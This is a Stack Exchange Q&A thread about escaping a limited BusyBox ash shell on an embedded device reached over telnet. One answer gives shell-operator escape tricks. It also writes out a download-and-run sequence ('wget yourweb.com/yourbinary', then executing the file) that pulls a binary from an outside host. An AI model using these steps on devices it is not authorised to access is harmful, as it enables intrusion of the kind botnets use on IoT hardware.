{
    "title": "Limited BusyBox shell",
    "link": "https://reverseengineering.stackexchange.com/questions/13402/limited-busybox-shell",
    "content": "I'm testing some  embedded device, and there is lack of documentation. When I telnet to device, I get only limited shell.\n<pre><code>BusyBox v1.19.2 (built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\n# help\nBuilt-in commands:\n------------------\n        . : [ [[ bg break cd chdir continue echo eval exec exit export\n        false fg getopts hash help jobs kill local printf pwd read readonly\n        return set shift source test times trap true type ulimit umask\n        unset wait\n</code></pre>\nThis is limited shell, its not clear, how to get into the full shell?\n",
    "votes": "0",
    "answers": 3,
    "views": "9k",
    "tags": [
        "linux",
        "firmware",
        "embedded",
        "networking"
    ],
    "user": "fxgreen",
    "time": "Sep 3, 2016 at 12:58",
    "comments": [],
    "answers_data": [
        {
            "content": "The command you need is <pre><code>chsh</code></pre> (change shell) - this is part of the\n<pre><code>shadow</code></pre> or <pre><code>shadow-utils</code></pre> package.\nYou can also manually edit <pre><code>/etc/password</code></pre> to change the shell from \n<pre><code>/bin/ash</code></pre> to something else:\nBUT => be very careful that the new shell exists or you will lock yourself out !!!\n\n\nYou will need to be <pre><code>root</code></pre> to do either of the above.\n",
            "votes": "3",
            "user": "Stuart Cardall",
            "time": "Apr 14, 2017 at 18:14",
            "is_accepted": false,
            "comments": []
        },
        {
            "content": "BusyBox is mainly focused on size-optimizing and commands could be excluded/included during compile time. So, without providing additional informations, it seems to be a very limited set of installed components.\nHowever, it should be clear, that this doesn't mean that the firmware of the device doesn't support specific utilities per se. If this is not flully clear, you should take a look at the FAQ - What is Busybox section. Some cites should make this fully clear:\n\n\"Can I enable FTP?\" - \"We don't know whether Foomatic-9000 firmware\n  comes with Busybox binary with enabled ftpd applet. (If you have\n  access to shell prompt, try running \"busybox ftpd --help\"). If it\n  does, you probably will be able to enable it. Unfortunately, we don't\n  know how Foomatic-9000 firmware manages starting and stopping of\n  various services (in case they already have ftpd sevice and it is just\n  disabled), or how to create and enable a new service on Foomatic-9000\n  (if they dont). Try googling for it.\"\n\"Can I enable SCP?\" - \"Busybox-1.23.4 does not have scp applet.\n  However, Foomatic-9000 might have scp installed (say, if they have\n  dropbear installed), and it may be possible to enable it. If not, it\n  may be possible to build and install your own scp tool. Try googling\n  for it.\"\n\nYou should probably focus more on the specific device and installed firmware, than concentrate on the limited set of components linked to Busybox itself.\n",
            "votes": "2",
            "user": "knx",
            "time": "Aug 31, 2016 at 20:21",
            "is_accepted": false,
            "comments": [
                {
                    "user": "fxgreen",
                    "text": "<span class=\"comment-copy\">ok, forgot cli command.</span>",
                    "time": null
                }
            ]
        },
        {
            "content": "Unfortunately for you, nowadays most embedded devices (i.e. routers, iot devices, etc..) try to prevent the users to access the inner system so they can't hack or modify it. This is a measure to prevent the work of botnets like mirai, though the protections are not always very effective.\nA limited busybox shell is a very common scenario. Luckily, speaking in general, busybox requires an underlying shell if there's any kind of user interface (like telnet or ssh). This means that it may be possible to bypass that shell and run commands on the underlying shell (i.e. /bin/sh is very common).\nBefore trying to escape the busybox sandbox, you must have in account the following:\n\nThe manufacturer may have modified the busybox shell to patch this techniques\nThe underlying shell can be an (full or partial) unprivileged shell. This means that even if you manage to run commands on it, they may not work or tell you that you don't have enough rights.\nThe underlying shell may be also another limited shell (not common)\n\nOnce you are ready, you can try the following \"tricks\":\n(All of the rely on shell operators)\nTry things like\n<pre><code>echo \"Hello World\" & <your command>\n</code></pre>\nThis will execute your command if:\n\nThe binary is available (so basically if it's installed in the system)\nThe shell has access to it (privileges)\n\nThere are other methods like:\n<pre><code>echo \"Hello World\" `your command`\necho \"Hello World\" || <your command>\n</code></pre>\nAnd other variations you can find over the internet or try by yourself.\nEDIT: I'm editing to add an example of how you could escape the shell and gain further execution.\n<pre><code>echo \"Hello World\" & wget yourweb.com/yourbinary\necho \"Hello World\" & chmod yourbinary \necho \"Hello World\" & ./yourbinary\n</code></pre>\nor directly ./yourbinary\nThat's the idea. As for the chmod sorry but I don't remember the exact arguments to give execution permissions.\nEDIT2: I've noticed your shell says ash, so probably busybox has been executed from an (automated) script running from ash. In this case you would like to directly run commands on the /bin/ash shell.\n",
            "votes": "1",
            "user": "78dtat78da",
            "time": "Apr 16, 2017 at 16:32",
            "is_accepted": false,
            "comments": []
        }
    ]
}